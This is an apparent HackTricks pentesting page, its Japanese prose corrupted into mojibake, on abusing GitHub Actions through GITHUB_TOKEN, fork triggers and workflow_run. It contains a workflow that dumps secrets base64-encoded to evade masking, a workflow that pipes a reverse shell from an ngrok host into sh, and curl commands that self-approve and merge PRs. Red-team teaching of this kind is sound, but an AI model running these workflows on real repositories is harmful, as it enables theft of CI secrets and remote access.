# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ä»¥ä¸‹ã®å†…å®¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* æ”»æ’ƒè€…ãŒGithub Actionã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããŸå ´åˆã®**å½±éŸ¿ã®æ¦‚è¦**
* **ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ç•°ãªã‚‹æ–¹æ³•**ï¼š
* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®**æ¨©é™**ã‚’æŒã¤ã“ã¨
* **ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**é–¢é€£ã®ãƒˆãƒªã‚¬ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨
* **ä»–ã®å¤–éƒ¨ã‚¢ã‚¯ã‚»ã‚¹**æŠ€è¡“ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨
* ã™ã§ã«ä¾µå®³ã•ã‚ŒãŸãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ã®**ãƒ”ãƒœãƒƒãƒˆ**
* æœ€å¾Œã«ã€**å†…éƒ¨ã‹ã‚‰ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆæŠ€è¡“**ã«é–¢ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆå‰è¿°ã®å½±éŸ¿ã‚’å¼•ãèµ·ã“ã™ï¼‰

## Impacts Summary

[**Github Actionsã®åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã™ã‚‹**](../basic-github-information.md#github-actions)ã«ã¤ã„ã¦ã®ç´¹ä»‹ã€‚

ã‚‚ã—ã‚ãªãŸãŒ**GitHub Actionså†…ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹**å ´åˆã€ã‚ãªãŸã¯ä»¥ä¸‹ã®ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

* ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã«ãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸ**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦**AWSã‚„GCPãªã©ã®å¤–éƒ¨ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆ**ã‚„ä»–ã®**ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ä¾µå®³ã™ã‚‹**ã“ã¨ã€‚
* ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ãŒè³‡ç”£ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã¾ãŸã¯ä¿å­˜ã™ã‚‹å ´åˆã€æœ€çµ‚è£½å“ã‚’å¤‰æ›´ã—ã€ã‚µãƒ—ãƒ©ã‚¤ãƒã‚§ãƒ¼ãƒ³æ”»æ’ƒã‚’å¯èƒ½ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **ã‚«ã‚¹ã‚¿ãƒ ãƒ¯ãƒ¼ã‚«ãƒ¼ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—**ã€è¨ˆç®—èƒ½åŠ›ã‚’æ‚ªç”¨ã—ã¦ä»–ã®ã‚·ã‚¹ãƒ†ãƒ ã«ãƒ”ãƒœãƒƒãƒˆã™ã‚‹ã“ã¨ã€‚
* `GITHUB_TOKEN`ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸæ¨©é™ã«å¿œã˜ã¦ã€**ãƒªãƒã‚¸ãƒˆãƒªã‚³ãƒ¼ãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹**ã“ã¨ã€‚

## GITHUB\_TOKEN

ã“ã®ã€Œ**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆ**ã€ï¼ˆ`${{ secrets.GITHUB_TOKEN }}`ãŠã‚ˆã³`${{ github.token }}`ã‹ã‚‰æ¥ã‚‹ï¼‰ã¯ã€ç®¡ç†è€…ãŒã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ãŸã¨ãã«ä¸ãˆã‚‰ã‚Œã¾ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯**Githubã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä½¿ç”¨ã™ã‚‹ã‚‚ã®ã¨åŒã˜**ã§ã‚ã‚Šã€åŒã˜ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼š[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubã¯ã€ãƒªãƒã‚¸ãƒˆãƒªé–“ã®**ã‚¯ãƒ­ã‚¹ãƒªãƒã‚¸ãƒˆãƒªã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹**[**ãƒ•ãƒ­ãƒ¼**](https://github.com/github/roadmap/issues/74)ã‚’ãƒªãƒªãƒ¼ã‚¹ã™ã‚‹ã¹ãã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªãƒã‚¸ãƒˆãƒªãŒ`GITHUB_TOKEN`ã‚’ä½¿ç”¨ã—ã¦ä»–ã®å†…éƒ¨ãƒªãƒã‚¸ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
{% endhint %}

ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã®å¯èƒ½ãª**æ¨©é™**ã¯æ¬¡ã®ãƒªãƒ³ã‚¯ã§ç¢ºèªã§ãã¾ã™ï¼š[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

ãƒˆãƒ¼ã‚¯ãƒ³ã¯**ã‚¸ãƒ§ãƒ–ãŒå®Œäº†ã—ãŸå¾Œã«æœŸé™åˆ‡ã‚Œã«ãªã‚Šã¾ã™**ã€‚\
ã“ã‚Œã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã§ã§ãã‚‹èˆˆå‘³æ·±ã„ã“ã¨ï¼š

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PRã‚’æ‰¿èªã™ã‚‹" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PRã‚’ä½œæˆ" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ã„ãã¤ã‹ã®å ´é¢ã§ã€**Github Actionsã®envsã‚„ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆå†…ã«githubãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„**ã€‚ã“ã‚Œã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒªãƒã‚¸ãƒˆãƒªã‚„çµ„ç¹”ã«å¯¾ã—ã¦ã‚ˆã‚Šå¤šãã®æ¨©é™ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

<details>

<summary>Github Actionã®å‡ºåŠ›ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ã£ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªãƒã‚¸ãƒˆãƒªã«ä¸ãˆã‚‰ã‚ŒãŸGithubãƒˆãƒ¼ã‚¯ãƒ³ã®æ¨©é™ã‚’**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ­ã‚°ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§**ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## è¨±å¯ã•ã‚ŒãŸå®Ÿè¡Œ

{% hint style="info" %}
ã“ã‚Œã¯Githubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å±é™ºã«ã•ã‚‰ã™æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã§ã™ã€‚ã“ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€**çµ„ç¹”å†…ã«æ–°ã—ã„ãƒªãƒã‚¸ãƒˆãƒªã‚’ä½œæˆã™ã‚‹ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ãŒã‚ã‚‹ã‹ã€**ãƒªãƒã‚¸ãƒˆãƒªã«å¯¾ã™ã‚‹æ›¸ãè¾¼ã¿æ¨©é™**ãŒã‚ã‚‹ã“ã¨ã‚’å‰æã¨ã—ã¦ã„ã¾ã™ã€‚

ã“ã®ã‚·ãƒŠãƒªã‚ªã«ã„ã‚‹å ´åˆã¯ã€[ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³æŠ€è¡“](./#post-exploitation-techniques-from-inside-an-action)ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚
{% endhint %}

### ãƒªãƒã‚¸ãƒˆãƒªä½œæˆã‹ã‚‰ã®å®Ÿè¡Œ

çµ„ç¹”ã®ãƒ¡ãƒ³ãƒãƒ¼ãŒ**æ–°ã—ã„ãƒªãƒã‚¸ãƒˆãƒªã‚’ä½œæˆã§ã**ã€ã‚ãªãŸãŒGithubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹å ´åˆã€**æ–°ã—ã„ãƒªãƒã‚¸ãƒˆãƒªã‚’ä½œæˆã—ã¦çµ„ç¹”ãƒ¬ãƒ™ãƒ«ã§è¨­å®šã•ã‚ŒãŸã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

### æ–°ã—ã„ãƒ–ãƒ©ãƒ³ãƒã‹ã‚‰ã®å®Ÿè¡Œ

æ—¢ã«Githubã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ãƒªãƒã‚¸ãƒˆãƒªã§**æ–°ã—ã„ãƒ–ãƒ©ãƒ³ãƒã‚’ä½œæˆã§ãã‚‹**å ´åˆã€**ãã‚Œã‚’ä¿®æ­£ã—ã€**ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€**ãã®æ–°ã—ã„ãƒ–ãƒ©ãƒ³ãƒã‹ã‚‰ãã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’**å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ–¹æ³•ã§ã€**ãƒªãƒã‚¸ãƒˆãƒªãŠã‚ˆã³çµ„ç¹”ãƒ¬ãƒ™ãƒ«ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŸã ã—ã€ã©ã®ã‚ˆã†ã«å‘¼ã°ã‚Œã¦ã„ã‚‹ã‹ã‚’çŸ¥ã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

ä¿®æ­£ã•ã‚ŒãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’**æ‰‹å‹•ã§**å®Ÿè¡Œå¯èƒ½ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**PRãŒä½œæˆã•ã‚ŒãŸã¨ã**ã‚„**ã‚³ãƒ¼ãƒ‰ãŒãƒ—ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸã¨ã**ï¼ˆã©ã‚Œã ã‘ç›®ç«‹ã¡ãŸã„ã‹ã«ã‚ˆã‚Šã¾ã™ï¼‰ï¼š
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## ãƒ•ã‚©ãƒ¼ã‚¯ã•ã‚ŒãŸå®Ÿè¡Œ

{% hint style="info" %}
æ”»æ’ƒè€…ãŒ**ä»–ã®ãƒªãƒã‚¸ãƒˆãƒªã®Github Actionã‚’å®Ÿè¡Œã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ç•°ãªã‚‹ãƒˆãƒªã‚¬ãƒ¼ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒˆãƒªã‚¬ãƒ¼å¯èƒ½ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒä¸é©åˆ‡ã«æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã‚Œã‚‰ã‚’å¦¥å”ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

### `pull_request`

ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãƒˆãƒªã‚¬ãƒ¼**`pull_request`**ã¯ã€ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå—ä¿¡ã•ã‚Œã‚‹ãŸã³ã«ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’å®Ÿè¡Œã—ã¾ã™ãŒã€ã„ãã¤ã‹ã®ä¾‹å¤–ãŒã‚ã‚Šã¾ã™ï¼šãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**åˆã‚ã¦**ã‚ãªãŸãŒ**ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã—ã¦ã„ã‚‹å ´åˆã€ã„ãã¤ã‹ã®**ãƒ¡ãƒ³ãƒ†ã‚¤ãƒŠãƒ¼**ãŒãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®**å®Ÿè¡Œ**ã‚’**æ‰¿èª**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ¶é™**ã¯**åˆã‚ã¦ã®**è²¢çŒ®è€…ã«å¯¾ã™ã‚‹ã‚‚ã®ã§ã‚ã‚‹ãŸã‚ã€ã‚ãªãŸã¯**æœ‰åŠ¹ãªãƒã‚°/ã‚¿ã‚¤ãƒ—ãƒŸã‚¹ã‚’ä¿®æ­£ã™ã‚‹**ã“ã¨ã§è²¢çŒ®ã—ã€ãã®å¾Œ**æ–°ã—ã„`pull_request`æ¨©é™ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ä»–ã®PRã‚’é€ä¿¡ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

**ã“ã‚Œã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã—ãŸãŒã€ã†ã¾ãã„ãã¾ã›ã‚“ã§ã—ãŸ**ï¼š~~åˆ¥ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«è²¢çŒ®ã—ãŸèª°ã‹ã®åå‰ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã€ãã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ã§ã™ã€‚~~
{% endhint %}

ã•ã‚‰ã«ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**æ›¸ãè¾¼ã¿æ¨©é™**ã¨**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚¢ã‚¯ã‚»ã‚¹**ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒªãƒã‚¸ãƒˆãƒªã«å¯¾ã—ã¦é˜²ãã¾ã™ã€‚ã“ã‚Œã¯[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã¾ã™ï¼š

> `GITHUB_TOKEN`ã‚’é™¤ã„ã¦ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯ãƒ©ãƒ³ãƒŠãƒ¼ã«æ¸¡ã•ã‚Œã¾ã›ã‚“**ã€‚ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒ**ãƒ•ã‚©ãƒ¼ã‚¯ã•ã‚ŒãŸ**ãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰ãƒˆãƒªã‚¬ãƒ¼ã•ã‚ŒãŸå ´åˆã€**`GITHUB_TOKEN`ã¯ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãŠã„ã¦**èª­ã¿å–ã‚Šå°‚ç”¨æ¨©é™**ã‚’æŒã¡ã¾ã™**ã€‚

æ”»æ’ƒè€…ã¯Github Actionã®å®šç¾©ã‚’å¤‰æ›´ã—ã¦ä»»æ„ã®ã“ã¨ã‚’å®Ÿè¡Œã—ã€ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ã‹ã—ã€å‰è¿°ã®åˆ¶é™ã®ãŸã‚ã«ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã‚“ã ã‚Šãƒªãƒã‚¸ãƒˆãƒªã‚’ä¸Šæ›¸ãã—ãŸã‚Šã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚

{% hint style="danger" %}
**ã¯ã„ã€æ”»æ’ƒè€…ãŒPRã§ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹github actionã‚’å¤‰æ›´ã—ãŸå ´åˆã€å½¼ã®Github ActionãŒä½¿ç”¨ã•ã‚Œã€å…ƒã®ãƒªãƒã‚¸ãƒˆãƒªã®ã‚‚ã®ã¯ä½¿ç”¨ã•ã‚Œã¾ã›ã‚“ï¼**
{% endhint %}

æ”»æ’ƒè€…ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ãŸã‚ã€`GITHUB_TOKEN`ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚„æ›¸ãè¾¼ã¿æ¨©é™ãŒãªãã¦ã‚‚ã€æ”»æ’ƒè€…ã¯ä¾‹ãˆã°**æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

### **`pull_request_target`**

ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãƒˆãƒªã‚¬ãƒ¼**`pull_request_target`**ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒªãƒã‚¸ãƒˆãƒªã«**æ›¸ãè¾¼ã¿æ¨©é™**ã¨**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã¡ï¼ˆè¨±å¯ã‚’æ±‚ã‚ã¾ã›ã‚“ï¼‰ã€

ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãƒˆãƒªã‚¬ãƒ¼**`pull_request_target`**ã¯**ãƒ™ãƒ¼ã‚¹ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã§å®Ÿè¡Œã•ã‚Œã€PRã«ã‚ˆã£ã¦ä¸ãˆã‚‰ã‚ŒãŸã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆ**ä¿¡é ¼ã§ããªã„ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãªã„ãŸã‚**ï¼‰ã€‚`pull_request_target`ã«é–¢ã™ã‚‹è©³ç´°ã¯[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)ã€‚\
ã•ã‚‰ã«ã€ã“ã®ç‰¹å®šã®å±é™ºãªä½¿ç”¨ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€[**githubã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)ã€‚

**å®Ÿè¡Œã•ã‚Œã‚‹ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼**ãŒ**ãƒ™ãƒ¼ã‚¹**ã§å®šç¾©ã•ã‚ŒãŸã‚‚ã®ã§ã‚ã‚Šã€**PR**ã§ã¯ãªã„ãŸã‚ã€**`pull_request_target`**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯**å®‰å…¨**ã«è¦‹ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**å®‰å…¨ã§ãªã„å ´åˆãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™**ã€‚

ãã—ã¦ã€ã“ã‚Œã«ã¯**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ãŒã‚ã‚Šã¾ã™ã€‚

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run)ãƒˆãƒªã‚¬ãƒ¼ã¯ã€åˆ¥ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒ`completed`ã€`requested`ã€ã¾ãŸã¯`in_progress`ã®ã¨ãã«ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚

ã“ã®ä¾‹ã§ã¯ã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯ã€åˆ¥ã®ã€Œãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒå®Œäº†ã—ãŸå¾Œã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ï¼š
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

ã“ã®ç¨®ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯ã€**`pull_request`** ã¾ãŸã¯ **`pull_request_target`** ã‚’ä»‹ã—ã¦å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ **ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹** **ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼** ã« **ä¾å­˜ã—ã¦ã„ã‚‹** å ´åˆã€æ”»æ’ƒã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã„ãã¤ã‹ã®è„†å¼±ãªä¾‹ã¯ [**ã“ã®ãƒ–ãƒ­ã‚°**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚** æœ€åˆã®ä¾‹ã¯ã€**`workflow_run`** ãƒˆãƒªã‚¬ãƒ¼ã•ã‚ŒãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒæ”»æ’ƒè€…ã®ã‚³ãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™: `${{ github.event.pull_request.head.sha }}`\
